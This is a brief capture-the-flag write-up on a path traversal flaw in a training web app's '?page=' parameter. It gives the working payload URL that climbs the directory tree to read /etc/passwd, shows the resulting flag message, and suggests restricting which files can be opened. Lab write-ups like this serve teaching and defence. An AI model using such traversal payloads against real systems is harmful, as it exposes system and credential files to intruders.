# Unrestricted Path Traversal

## Vulnerability

The page content change based on the `?page=` query parameter.

Going up into the file system then reading a system file display the flag.

We get the flag by visiting the URL: [`?page=../../../../../../../etc/passwd`](http://darkly/index.php?page=../../../../../../../etc/passwd)
```html
Congratulaton!! The flag is : ...
```

## Possible Fix

- Restrict the files that can be opened.
